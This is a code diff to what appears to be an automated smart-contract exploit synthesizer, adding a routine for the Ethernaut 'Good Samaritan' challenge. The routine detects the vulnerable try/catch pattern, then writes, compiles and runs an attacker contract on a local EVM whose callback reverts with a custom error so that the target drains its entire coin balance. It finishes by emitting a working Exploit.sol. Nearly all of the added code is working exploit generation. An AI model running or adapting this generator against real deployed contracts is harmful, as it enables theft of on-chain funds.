@@ -2944,6 +2944,96 @@ def _synth_dex_drain(name, target_src, invariants_src, manifest, scan_step, t0):
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_good_samaritan(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Good Samaritan 류: try/catch 로 커스텀 에러(NotEnoughBalance)를 잡으면
+    전액 전송(transferRemainder)하는 구조. 수신자 콜백(notify)에서 그 에러를 소액일 때만
+    던지면, 첫 소액 기부에서 전액 인출 경로가 발동해 잔액 전부를 가져온다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    if not (re.search(r"\btry\b", tb) and re.search(r"\bcatch\b", tb)
+            and re.search(r"NotEnoughBalance", tb) and re.search(r"transferRemainder|transfer\w*\(", tb)):
+        return None
+    # 진입 함수(try/catch 를 가진 external)
+    entry = None
+    for fn in _functions(tb):
+        if fn["external"] and "try" in fn["body"] and "catch" in fn["body"] and not fn["args"]:
+            entry = fn["name"]; break
+    if not entry:
+        return None
+    # notify 콜백 이름(수신자에서 불리는 함수) — INotifyable 인터페이스에서 추출
+    notify = None
+    im = re.search(r"interface\s+\w+\s*\{\s*function\s+(\w+)\s*\(\s*uint", strip)
+    if im: notify = im.group(1)
+    if not notify:
+        nm2 = re.search(r"\b(\w+)\s*\(\s*amount", tb)
+        notify = nm2.group(1) if nm2 else "notify"
+    _solcv, _evm = _solc_for(target_src)
+    pwn_src = (HEADER +
+        f"interface IGS {{ function {entry}() external returns (bool); }}\n"
+        "contract Pwn {\n"
+        "    error NotEnoughBalance();\n"
+        f"    function attack(address gs) external {{ IGS(gs).{entry}(); }}\n"
+        f"    function {notify}(uint256 amount) external {{ if (amount <= 10) revert NotEnoughBalance(); }}\n"
+        "}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or "Pwn" not in arts:
+        return None
+    abi = arts[name]["abi"]
+    w3, acct = _mk_evm()
+    def deploy(cn, args):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":acct,"gas":9_000_000})).contractAddress
+    try:
+        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
+        paddr = deploy("Pwn", [])
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    # coin 주소 + balances 게터로 효과 관찰
+    if not _has_getter(abi, "coin"):
+        return None
+    coin_addr = tc.functions.coin().call()
+    coin_abi = [{"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]
+    coin = w3.eth.contract(address=coin_addr, abi=coin_abi)
+    a0 = int(coin.functions.balances(paddr).call())
+    pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
+    try:
+        pwn.functions.attack(Web3.to_checksum_address(taddr)).transact({"from":acct,"gas":3_000_000})
+    except Exception:
+        return None
+    a1 = int(coin.functions.balances(paddr).call())
+    if not (a1 > a0 and a1 >= 1000):   # 전액(≈10^6) 유출
+        return None
+    poc = (HEADER +
+        "// Strategy: Good Samaritan. requestDonation() calls the wallet, which notifies the\n"
+        "// recipient; reverting with the NotEnoughBalance() custom error on the small donate\n"
+        "// makes the try/catch fall into transferRemainder(), sending the entire balance.\n"
+        f"interface IGS {{ function {entry}() external returns (bool); }}\n"
+        "contract Exploit {\n"
+        "    error NotEnoughBalance();\n"
+        f"    function run(address gs) external {{ IGS(gs).{entry}(); }}\n"
+        f"    function {notify}(uint256 amount) external {{ if (amount <= 10) revert NotEnoughBalance(); }}\n"
+        "}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (good-samaritan)","strategy":"good-samaritan","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":"entire coin balance drained via custom-error catch",
+            "strategy":f"good-samaritan:{entry}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"수신자 콜백에서 NotEnoughBalance 커스텀 에러를 던져 try/catch 의 전액 인출 경로를 발동시켰습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_dex_two_drain(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Dex Two 류: swap 이 from/to 가 token1/token2 인지 확인하지 않아, 공격자가
     가짜 토큰을 dex 에 넣고 swap(fake, real) 로 진짜 토큰을 전량 인출한다. 두 진짜 풀을
@@ -3906,6 +3996,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0u) Good Samaritan (커스텀 에러 catch → 전액 인출)
+    try:
+        r = _synth_good_samaritan(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 1) 호출 시퀀스 탐색
     try:
         found=_fuzz_search(name, target_src, invariants_src, manifest, do_verify)
@@ -3973,7 +4070,7 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
                _synth_shop, _synth_lockup_bypass, _synth_gas_griefing, _synth_force,
                _synth_gatekeeper_two, _synth_gatekeeper_one, _synth_magicnumber,
                _synth_higher_order, _synth_switch, _synth_array_underflow,
-               _synth_dex_two_drain, _synth_dex_drain):
+               _synth_dex_two_drain, _synth_dex_drain, _synth_good_samaritan):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
